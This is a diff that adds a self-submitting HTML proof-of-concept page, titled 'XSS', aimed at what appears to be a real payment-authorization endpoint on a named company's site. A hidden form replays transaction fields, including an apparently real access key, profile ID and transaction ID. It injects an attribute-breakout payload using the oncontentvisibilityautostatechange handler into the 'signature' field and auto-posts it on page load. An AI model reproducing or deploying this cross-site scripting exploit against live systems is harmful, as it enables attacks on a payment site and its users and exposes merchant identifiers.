@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang='pt-BR'>
+<head>
+  <meta charset='utf-8' />
+  <title>XSS</title>
+</head>
+<body>
+  <div class='box'>
+   
+
+    <form id='f' action='https://catsoskits.elandersamericas.com/CreditCardPayment/PaymentAuthorized.aspx' method='post' target='_self' enctype='application/x-www-form-urlencoded' accept-charset='utf-8'>
+      <!-- campos (hidden) equivalentes ao --data-raw do curl -->
+      <input type="hidden" name='utf8' value='✓'>
+      <input type="hidden" name='req_locale' value='pt-BR'>
+      <input type="hidden" name='signature' value='xdxd" oncontentvisibilityautostatechange=alert(document.domain+`\r\nXSS`) style=content-visibility:auto>XSS'>
+      <input type="hidden" name='req_card_type_selection_indicator' value='1'>
+      <input type="hidden" name='invalid_fields' value='item_0_unit_price,amount'>
+      <input type="hidden" name='req_item_0_sku' value='Total'>
+      <input type="hidden" name='req_item_0_code' value='service'>
+      <input type="hidden" name='req_item_0_unit_price' value='4,91'>
+      <input type="hidden" name='req_item_0_quantity' value='1'>
+      <input type="hidden" name='reason_code' value='102'>
+      <input type="hidden" name='req_payment_method' value='card'>
+      <input type="hidden" name='req_amount' value='4,91'>
+      <input type="hidden" name='req_currency' value='usd'>
+      <input type="hidden" name='decision' value='ERROR'>
+      <input type="hidden" name='req_merchant_defined_data1' value='3472.WMP2P     '>
+      <input type="hidden" name='req_merchant_defined_data2' value='848667'>
+      <input type="hidden" name='message' value='Request parameters are invalid or missing'>
+      <input type="hidden" name='signed_field_names' value='decision,req_access_key,req_profile_id,req_transaction_uuid,req_transaction_type,req_reference_number,req_amount,req_currency,req_line_item_count,req_locale,req_payment_method,req_item_0_code,req_item_0_name,req_item_0_quantity,req_item_0_sku,req_item_0_unit_price,req_card_type_selection_indicator,req_merchant_defined_data1,req_merchant_defined_data2,invalid_fields,reason_code,message,signed_field_names,signed_date_time'>
+      <input type="hidden" name='req_transaction_uuid' value='c89f7130-7c8d-4b28-82cb-a21094df924c'>
+      <input type="hidden" name='req_transaction_type' value='sale'>
+      <input type="hidden" name='req_access_key' value='a302dbe8b9f232ea94039612c8040050'>
+      <input type="hidden" name='req_profile_id' value='9DF2C724-8065-46C4-960C-D70E887AD878'>
+      <input type="hidden" name='req_item_0_name' value='Invoice'>
+      <input type="hidden" name='req_reference_number' value='848667'>
+      <input type="hidden" name='req_line_item_count' value='1'>
+      <input type="hidden" name='signed_date_time' value='2025-09-22T08:31:33Z'>
+
+     
+    </form>
+
+    
+  </div>
+
+  <script>
+    // botao para auto enviar apos 2s
+    document.addEventListener("DOMContentLoaded", function() {
+      document.getElementById("f").submit();
+    });
+  </script>
+</body>
+</html>
